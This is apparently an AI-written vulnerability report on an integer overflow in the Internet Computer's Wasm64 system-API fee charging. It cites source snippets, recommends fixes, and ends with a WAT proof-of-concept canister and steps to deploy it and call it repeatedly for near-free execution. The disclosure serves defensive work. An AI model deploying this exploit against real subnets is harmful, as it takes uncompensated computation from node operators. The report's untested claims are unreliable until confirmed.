Based on my thorough analysis of the code, here is my assessment:

---

### Title
Wasm64 Fee Overflow in `charge_direct_fee` Bypasses Instruction Accounting, Enabling Near-Free Execution — (`rs/embedders/src/wasmtime_embedder/linker.rs`)

### Summary

In Wasm64 mode, an unprivileged canister can call `ic0_msg_arg_data_copy` (or any byte-charging system API) with `size = i64::MAX`. This causes the computed fee to exceed `i64::MAX`, making `fee.get().try_into::<i64>()` fail at line 179. The error path returns `InstructionLimitExceeded` **without ever decrementing the instruction counter**. As a result, `instructions_left` is inflated, and `refund_unused_execution_cycles` refunds nearly the full prepaid execution cost — the canister pays almost nothing for the message execution.

### Finding Description

**Step 1 — Fee computation path:**

`ic0_msg_arg_data_copy` calls `charge_for_cpu_and_mem` → `charge_for_system_api_call`: [1](#0-0) 

`get_num_instructions_from_bytes` returns a 1:1 byte-to-instruction ratio: [2](#0-1) 

In Wasm64, the `size` parameter is `i64`. With `size = i64::MAX = 9,223,372,036,854,775,807`, the fee becomes `500 + 9,223,372,036,854,775,807 = 9,223,372,036,854,776,307`, which exceeds `i64::MAX`.

**Step 2 — Overflow triggers early return without counter decrement:** [3](#0-2) 

The `try_into()` fails, returning `InstructionLimitExceeded(instruction_limit)`. The `store_value` at line 185 is **never reached** — the instruction counter in the Wasm global is not decremented.

**Step 3 — Inflated `instructions_left` causes over-refund:**

After execution terminates, `instructions_left` is computed from the un-decremented counter: [4](#0-3) 

This inflated value is passed to `refund_unused_execution_cycles`: [5](#0-4) 

Without the overflow, the fee `F >> instruction_limit` would drive the counter deeply negative, `out_of_instructions` would fire, and `instructions_left = 0` (full charge). With the overflow, `instructions_left ≈ instruction_limit`, so the canister receives a near-full refund.

**Step 4 — Wasm64 is unconditionally enabled:**

Wasm64 mode is determined solely by the module's memory declaration (`(memory i64 ...)`). Any canister developer can deploy a Wasm64 module: [6](#0-5) 

There is no feature flag or governance gate blocking Wasm64 deployment.

**Step 5 — Wasm32 is not affected:**

In Wasm32, `size` is `i32`, max `≈ 2.1 × 10⁹`, so the fee is at most `≈ 2.1 × 10⁹` — far below `i64::MAX ≈ 9.2 × 10¹⁸`. The overflow path is unreachable in Wasm32.

### Impact Explanation

A Wasm64 canister calling `ic0_msg_arg_data_copy(0, 0, i64::MAX)` as its first instruction will:
- Prepay for `message_instruction_limit` (e.g., 40B) instructions worth of cycles
- Trigger the overflow, get `InstructionLimitExceeded`, and receive a refund for nearly all 40B instructions
- Net cost: only the few instructions executed before the system API call (overhead of the call itself)

This allows the canister to execute update messages at near-zero cycles cost, repeatable indefinitely. The subnet provides computation without being compensated.

### Likelihood Explanation

- Requires only deploying a Wasm64 canister (no privileged access, no governance, no key material)
- The exploit is a single system API call with a crafted `size` argument
- Wasm64 is production-enabled and already used by real canisters
- The `TODO: RUN-841: Cover with tests` comment on both `charge_for_system_api_call` and `charge_direct_fee` confirms this code path has no test coverage [7](#0-6) [8](#0-7) 

### Recommendation

1. **Immediate fix**: In `charge_direct_fee`, when `fee > i64::MAX`, instead of returning `InstructionLimitExceeded` with the slice limit, set the instruction counter to `i64::MIN` (or 0) and call `out_of_instructions` to properly account for the full charge before returning the error. This ensures `instructions_left = 0` regardless of the overflow path.

2. **Alternative**: Cap `fee` at `instruction_limit` before the `try_into()` — since any fee exceeding the limit is equivalent to consuming all remaining instructions.

3. **Add tests** as noted by the existing `TODO: RUN-841` comments.

### Proof of Concept

```wat
(module
  (import "ic0" "msg_arg_data_copy"
    (func $ic0_msg_arg_data_copy (param i64 i64 i64)))
  (memory i64 1)
  (func (export "canister_update exploit")
    ;; size = i64::MAX = 9223372036854775807
    (call $ic0_msg_arg_data_copy
      (i64.const 0)
      (i64.const 0)
      (i64.const 9223372036854775807))
  )
)
```

Deploy this Wasm64 canister, call `exploit` repeatedly. Each call prepays ~40B instructions worth of cycles but receives a near-full refund, achieving near-zero-cost execution. A unit test asserting `instructions_left == 0` when `fee > i64::MAX` would confirm the bug.

### Citations

**File:** rs/embedders/src/wasmtime_embedder/linker.rs (L136-137)
```rust
// TODO: RUN-841: Cover with tests
#[inline(always)]
```

**File:** rs/embedders/src/wasmtime_embedder/linker.rs (L138-147)
```rust
fn charge_for_system_api_call(
    caller: &mut Caller<'_, StoreData>,
    overhead: NumInstructions,
    num_bytes: usize,
) -> HypervisorResult<()> {
    let system_api = caller.data_mut().system_api()?;
    let bytes_charge = system_api.get_num_instructions_from_bytes(NumBytes::from(num_bytes as u64));
    let overhead = overhead.saturating_add(&bytes_charge);
    charge_direct_fee(caller, overhead)
}
```

**File:** rs/embedders/src/wasmtime_embedder/linker.rs (L149-150)
```rust
// TODO: RUN-841: Cover with tests
#[inline(always)]
```

**File:** rs/embedders/src/wasmtime_embedder/linker.rs (L179-185)
```rust
    let fee = fee.get().try_into().map_err(|_| {
        HypervisorError::InstructionLimitExceeded(NumInstructions::from(instruction_limit as u64))
    })?;

    // Now we can subtract the fee and store the new instruction counter.
    instruction_counter = instruction_counter.saturating_sub(fee);
    store_value(&num_instructions_global, instruction_counter, caller)?;
```

**File:** rs/embedders/src/wasmtime_embedder/system_api.rs (L1988-1990)
```rust
    fn get_num_instructions_from_bytes(&self, num_bytes: NumBytes) -> NumInstructions {
        NumInstructions::from(num_bytes.get())
    }
```

**File:** rs/embedders/src/wasm_executor.rs (L670-677)
```rust
    let mut slice_instructions_executed =
        system_api.slice_instructions_executed(instruction_counter);
    // Capping at the limit to avoid an underflow when computing the remaining
    // instructions below.
    let message_instructions_executed = system_api
        .message_instructions_executed(instruction_counter)
        .min(message_instruction_limit);
    let message_instructions_left = message_instruction_limit - message_instructions_executed;
```

**File:** rs/cycles_account_manager/src/cycles_account_manager.rs (L529-537)
```rust
        let num_instructions_to_refund =
            std::cmp::min(num_instructions, num_instructions_initially_charged);
        let cycles_to_refund = self
            .scale_cost(
                self.convert_instructions_to_cycles(num_instructions_to_refund, execution_mode),
                subnet_cycles_config,
            )
            .min(prepaid_execution_cycles);
        system_state.refund_cycles(prepaid_execution_cycles, cycles_to_refund);
```

**File:** rs/replicated_state/src/canister_state/execution_state.rs (L612-630)
```rust
pub enum WasmExecutionMode {
    Wasm32,
    Wasm64,
}

impl WasmExecutionMode {
    pub fn is_wasm64(&self) -> bool {
        match self {
            WasmExecutionMode::Wasm32 => false,
            WasmExecutionMode::Wasm64 => true,
        }
    }
    pub fn from_is_wasm64(is_wasm64: bool) -> Self {
        if is_wasm64 {
            WasmExecutionMode::Wasm64
        } else {
            WasmExecutionMode::Wasm32
        }
    }
```
